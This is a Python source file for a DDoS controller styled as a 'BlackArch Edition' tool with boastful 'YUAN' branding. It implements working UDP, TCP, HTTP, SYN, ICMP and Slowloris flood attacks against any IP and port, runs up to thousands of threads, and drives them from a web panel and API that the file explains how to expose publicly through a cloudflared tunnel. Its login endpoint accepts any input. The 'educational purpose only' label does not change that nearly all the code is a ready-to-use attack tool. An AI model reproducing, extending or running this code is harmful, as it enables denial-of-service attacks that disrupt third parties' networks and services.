#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║              YUAN's DDoS CONTROLLER - BLACKARCH EDITION          ║
║                    YUAN WAS HERE - NO SYSTEM IS SAFE              ║
║                         EDUCATIONAL PURPOSE ONLY                  ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import threading
import socket
import struct
import ssl
import json
import hashlib
import base64
import subprocess
import argparse
from datetime import datetime
from urllib.parse import urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque

# ==================== BLACKARCH CONFIGURATION ====================
DEFAULT_PORT = 8080
API_PORT = 8081
VERSION = "1.0 - BLACKARCH EDITION"
CODENAME = "YUAN'S FURY"
SIGNATURE = "[ Yu4n_Ph4nt0m ]"
MAX_THREADS = 5000

# BlackArch color scheme
class Colors:
    # BlackArch specific colors
    BA_RED = '\033[38;5;160m'
    BA_GREEN = '\033[38;5;40m'
    BA_BLUE = '\033[38;5;33m'
    BA_ORANGE = '\033[38;5;208m'
    BA_PURPLE = '\033[38;5;93m'
    BA_YELLOW = '\033[38;5;220m'
    BA_CYAN = '\033[38;5;51m'
    
    # Standard colors
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BLINK = '\033[5m'
    UNDERLINE = '\033[4m'

# Yuan's epic messages
YUAN_MESSAGES = [
    "YUAN WON", "YUAN RULES", "YUAN OWNS", "YUAN KING", "YUAN GOD",
    "YUAN LEGEND", "YUAN VICTORY", "YUAN DOMINATES", "YUAN CONQUERS",
    "YUAN DESTROYS", "YUAN ANNIHILATES", "YUAN TERMINATES", "YUAN ELIMINATES",
    "YUAN ERASES", "YUAN OBLITERATES", "YUAN DECIMATES", "YUAN DEVASTATES",
    "BLACKARCH DOMINATES", "SYSTEM BREACHED", "NETWORK OWNED"
]

# Attack state
current_attack = {
    'running': False,
    'target': '',
    'method': '',
    'threads': 0,
    'duration': 0,
    'start_time': 0,
    'packets_sent': 0,
    'bytes_sent': 0,
    'status': 'idle'
}

attack_thread = None
attack_lock = threading.Lock()

# ==================== NETWORK UTILITIES ====================

def get_local_ip():
    """Get local IP address automatically"""
    try:
        # Create socket to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            # Fallback: get hostname
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except:
            return "127.0.0.1"

def get_public_ip():
    """Try to get public IP (for cloudflared)"""
    try:
        import urllib.request
        with urllib.request.urlopen('https://api.ipify.org', timeout=3) as response:
            return response.read().decode('utf-8')
    except:
        return None

def check_cloudflared():
    """Check if cloudflared is installed"""
    try:
        result = subprocess.run(['which', 'cloudflared'], 
                               capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

def print_cloudflared_instructions(local_ip, port):
    """Print cloudflared tunnel instructions"""
    print(f"\n{Colors.BA_CYAN}╔════════════════════════════════════════════════════════════╗")
    print(f"║              CLOUDFLARED TUNNEL INSTRUCTIONS            ║")
    print(f"╚════════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    if check_cloudflared():
        print(f"{Colors.BA_GREEN}[✓] cloudflared is installed{Colors.RESET}")
        print(f"\n{Colors.BA_YELLOW}Run this command in another terminal:{Colors.RESET}")
        print(f"{Colors.WHITE}cloudflared tunnel --url http://{local_ip}:{port}{Colors.RESET}")
        print(f"\n{Colors.BA_GREEN}After running, cloudflared will give you a URL like:{Colors.RESET}")
        print(f"{Colors.BA_CYAN}https://random-name.trycloudflare.com{Colors.RESET}")
    else:
        print(f"{Colors.BA_RED}[!] cloudflared not found{Colors.RESET}")
        print(f"\n{Colors.BA_YELLOW}Install cloudflared:{Colors.RESET}")
        print(f"{Colors.WHITE}  Termux: pkg install cloudflared{Colors.RESET}")
        print(f"{Colors.WHITE}  Linux:  sudo apt install cloudflared{Colors.RESET}")
        print(f"{Colors.WHITE}  Mac:    brew install cloudflared{Colors.RESET}")

# ==================== DDoS ENGINE ====================

class PacketCounter:
    def __init__(self):
        self.sent = 0
        self.bytes = 0
        self.start = time.time()
        self.lock = threading.Lock()
        
    def add(self, packets=1, bytes=0):
        with self.lock:
            self.sent += packets
            self.bytes += bytes
            global current_attack
            with attack_lock:
                current_attack['packets_sent'] = self.sent
                current_attack['bytes_sent'] = self.bytes
            
    def get_stats(self):
        elapsed = time.time() - self.start
        with self.lock:
            return {
                'packets': self.sent,
                'bytes': self.bytes,
                'pps': int(self.sent / elapsed) if elapsed > 0 else 0,
                'bps': int(self.bytes / elapsed) if elapsed > 0 else 0,
                'elapsed': int(elapsed)
            }

class AttackEngine:
    def __init__(self, target, method, threads, duration):
        self.target = target
        self.method = method.upper()
        self.threads = min(threads, MAX_THREADS)
        self.duration = duration
        self.running = False
        self.counter = PacketCounter()
        
    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024)
        while self.running:
            try:
                sock.sendto(data, self.target)
                self.counter.add(1, 1024)
            except:
                pass
                
    def tcp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect(self.target)
                sock.send(os.urandom(1024))
                self.counter.add(1, 1024)
                sock.close()
            except:
                pass
                
    def http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect(self.target)
                request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                request += f"Host: {self.target[0]}\r\n"
                request += f"User-Agent: {random.choice(YUAN_MESSAGES)}\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: close\r\n\r\n"
                sock.send(request.encode())
                self.counter.add(1, len(request))
                sock.close()
            except:
                pass
                
    def syn_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running:
                sock.sendto(os.urandom(40), self.target)
                self.counter.add(1, 40)
        except:
            pass
            
    def icmp_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while self.running:
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + os.urandom(56)
                sock.sendto(packet, self.target)
                self.counter.add(1, 64)
        except:
            pass
            
    def slowloris(self):
        sockets = []
        while self.running:
            try:
                while len(sockets) < 100:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect(self.target)
                    sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target[0]}\r\n".encode())
                    sockets.append(sock)
                    self.counter.add(1, 100)
                
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-Yuan: {random.choice(YUAN_MESSAGES)}\r\n".encode())
                        self.counter.add(1, 50)
                    except:
                        sockets.remove(sock)
            except:
                pass
            time.sleep(5)
            
    def start(self):
        self.running = True
        global current_attack
        with attack_lock:
            current_attack['running'] = True
            current_attack['start_time'] = time.time()
            current_attack['status'] = 'running'
        
        # Select attack method
        method_map = {
            "UDP": self.udp_flood,
            "TCP": self.tcp_flood,
            "HTTP": self.http_flood,
            "SYN": self.syn_flood,
            "ICMP": self.icmp_flood,
            "SLOWLORIS": self.slowloris,
        }
        
        attack_func = method_map.get(self.method, self.tcp_flood)
        
        # Start threads
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            workers.append(t)
        
        print(f"{Colors.BA_GREEN}[✓] Attack started: {self.method} on {self.target}{Colors.RESET}")
        
        # Run for duration
        time.sleep(self.duration)
        self.stop()
        
    def stop(self):
        self.running = False
        global current_attack
        with attack_lock:
            current_attack['running'] = False
            current_attack['status'] = 'stopped'
        print(f"{Colors.BA_YELLOW}[!] Attack stopped{Colors.RESET}")

# ==================== WEB SERVER ====================

class WebHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.web_port = kwargs.pop('web_port', DEFAULT_PORT)
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Read and serve the HTML file
            html_file = os.path.join(os.path.dirname(__file__), 'ddos.html')
            if os.path.exists(html_file):
                with open(html_file, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"<html><body><h1>ddos.html not found</h1></body></html>")
                
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            with attack_lock:
                if current_attack['running']:
                    elapsed = int(time.time() - current_attack['start_time'])
                    remaining = max(0, current_attack['duration'] - elapsed)
                    rps = current_attack['packets_sent'] // max(elapsed, 1)
                else:
                    elapsed = 0
                    remaining = 0
                    rps = 0
                
                status = {
                    'running': current_attack['running'],
                    'status': current_attack['status'],
                    'target': current_attack['target'],
                    'method': current_attack['method'],
                    'threads': current_attack['threads'],
                    'duration': current_attack['duration'],
                    'elapsed': elapsed,
                    'remaining': remaining,
                    'packets': current_attack['packets_sent'],
                    'rps': rps,
                    'yuan_message': random.choice(YUAN_MESSAGES)
                }
            
            self.wfile.write(json.dumps(status).encode())
            
        elif self.path == '/api/network':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            network_info = {
                'local_ip': get_local_ip(),
                'port': self.web_port,
                'public_ip': get_public_ip(),
                'cloudflared_installed': check_cloudflared(),
                'local_url': f"http://{get_local_ip()}:{self.web_port}",
                'localhost_url': f"http://localhost:{self.web_port}"
            }
            self.wfile.write(json.dumps(network_info).encode())
            
        elif self.path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/login':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode()
                try:
                    data = json.loads(post_data)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'message': 'Login successful'}).encode())
                    return
                except:
                    pass
            
            self.send_response(400)
            self.end_headers()
            
        elif self.path == '/api/start':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode()
                try:
                    data = json.loads(post_data)
                    
                    # Parse target
                    target_str = data.get('target', '')
                    if ':' in target_str:
                        ip, port = target_str.split(':')
                        port = int(port)
                    else:
                        ip = target_str
                        port = 80
                    
                    threads = int(data.get('threads', 20))
                    duration = int(data.get('seconds', 30))
                    method = data.get('method', 'UDP').upper()
                    
                    global attack_thread
                    if attack_thread and attack_thread.is_alive():
                        with attack_lock:
                            current_attack['running'] = False
                        attack_thread.join(1)
                    
                    with attack_lock:
                        current_attack['target'] = target_str
                        current_attack['method'] = method
                        current_attack['threads'] = threads
                        current_attack['duration'] = duration
                        current_attack['packets_sent'] = 0
                        current_attack['bytes_sent'] = 0
                    
                    # Start attack in separate thread
                    attack_engine = AttackEngine((ip, port), method, threads, duration)
                    attack_thread = threading.Thread(target=attack_engine.start)
                    attack_thread.daemon = True
                    attack_thread.start()
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'message': 'Attack started'}).encode())
                    return
                    
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
                    return
            
            self.send_response(400)
            self.end_headers()
            
        elif self.path == '/api/stop':
            with attack_lock:
                current_attack['running'] = False
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True, 'message': 'Attack stopped'}).encode())
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

# ==================== BLACKARCH BANNER ====================

def print_blackarch_banner(port):
    """Print BlackArch Linux style banner"""
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    
    banner = f"""
{Colors.BA_RED}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║    ██╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗                           ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗████╗  ██║                           ║
║     ╚████╔╝ ██║   ██║███████║██╔██╗ ██║                           ║
║      ╚██╔╝  ██║   ██║██╔══██║██║╚██╗██║                           ║
║       ██║   ╚██████╔╝██║  ██║██║ ╚████║                           ║
║       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                           ║
║                                                                   ║
║                    {Colors.WHITE}DDoS CONTROLLER{Colors.BA_RED}                                ║
║                    {Colors.BA_ORANGE}{VERSION}{Colors.BA_RED}                        ║
║                                                                   ║
║     {Colors.BA_GREEN}┌─[{Colors.WHITE}root@{Colors.BA_BLUE}blackarch{Colors.BA_GREEN}]─[{Colors.WHITE}{os.path.basename(__file__)}{Colors.BA_GREEN}]{Colors.BA_RED}                   ║
║     {Colors.BA_GREEN}└──╼ {Colors.WHITE}$ python {os.path.basename(__file__)} --port {port}{Colors.BA_RED}              ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
    
{Colors.BA_GREEN}[✓]{Colors.WHITE} Attack Engine: {Colors.BA_GREEN}Ready{Colors.RESET}
{Colors.BA_GREEN}[✓]{Colors.WHITE} Local URL:     {Colors.BA_CYAN}http://localhost:{port}{Colors.RESET}
{Colors.BA_GREEN}[✓]{Colors.WHITE} Network URL:   {Colors.BA_CYAN}http://{local_ip}:{port}{Colors.RESET}"""
    
    if public_ip:
        banner += f"\n{Colors.BA_GREEN}[✓]{Colors.WHITE} Public IP:     {Colors.BA_CYAN}{public_ip}{Colors.RESET}"
    
    banner += f"\n{Colors.BA_GREEN}[✓]{Colors.WHITE} API Endpoint:  {Colors.BA_CYAN}http://{local_ip}:{port}/api{Colors.RESET}"
    
    print(banner)
    print_cloudflared_instructions(local_ip, port)

# ==================== COMMAND LINE INTERFACE ====================

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="YUAN's DDoS Controller - BlackArch Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.BA_GREEN}Examples:{Colors.RESET}
  {Colors.BA_CYAN}python {os.path.basename(__file__)}{Colors.RESET}                    # Run on default port 8080
  {Colors.BA_CYAN}python {os.path.basename(__file__)} --port 9090{Colors.RESET}        # Run on custom port 9090
  {Colors.BA_CYAN}python {os.path.basename(__file__)} -p 8080{Colors.RESET}            # Short form
  {Colors.BA_CYAN}python {os.path.basename(__file__)} --help{Colors.RESET}             # Show this help

{Colors.BA_YELLOW}After starting, access the web interface at:{Colors.RESET}
  {Colors.BA_CYAN}http://localhost:PORT{Colors.RESET}  (where PORT is your specified port)

{Colors.BA_RED}⚠️  EDUCATIONAL PURPOSE ONLY{Colors.RESET}
        '''
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=DEFAULT_PORT,
        help=f'Port to run the web server on (default: {DEFAULT_PORT})'
    )
    
    parser.add_argument(
        '--version', '-v',
        action='version',
        version=f'YUAN DDoS Controller {VERSION}'
    )
    
    return parser.parse_args()

# ==================== MAIN ====================

def main():
    # Parse command line arguments
    args = parse_arguments()
    WEB_PORT = args.port
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print_blackarch_banner(WEB_PORT)
    
    print(f"\n{Colors.BA_GREEN}[✓]{Colors.WHITE} Starting web server on port {WEB_PORT}{Colors.RESET}")
    print(f"{Colors.BA_YELLOW}[!]{Colors.WHITE} Press Ctrl+C to stop{Colors.RESET}\n")
    
    try:
        # Create server with custom handler that knows the port
        server = HTTPServer(('0.0.0.0', WEB_PORT), 
                           lambda *args, **kwargs: WebHandler(*args, web_port=WEB_PORT, **kwargs))
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.BA_YELLOW}[!]{Colors.WHITE} Shutting down...{Colors.RESET}")
        with attack_lock:
            current_attack['running'] = False
        server.shutdown()
        print(f"{Colors.BA_GREEN}[✓]{Colors.WHITE} Server stopped{Colors.RESET}")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"{Colors.BA_RED}[!]{Colors.WHITE} Port {WEB_PORT} is already in use!{Colors.RESET}")
            print(f"{Colors.BA_YELLOW}[!]{Colors.WHITE} Try a different port:{Colors.RESET}")
            print(f"  python {os.path.basename(__file__)} --port 9090")
        else:
            print(f"{Colors.BA_RED}[!]{Colors.WHITE} Error: {e}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.BA_RED}[!]{Colors.WHITE} Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()
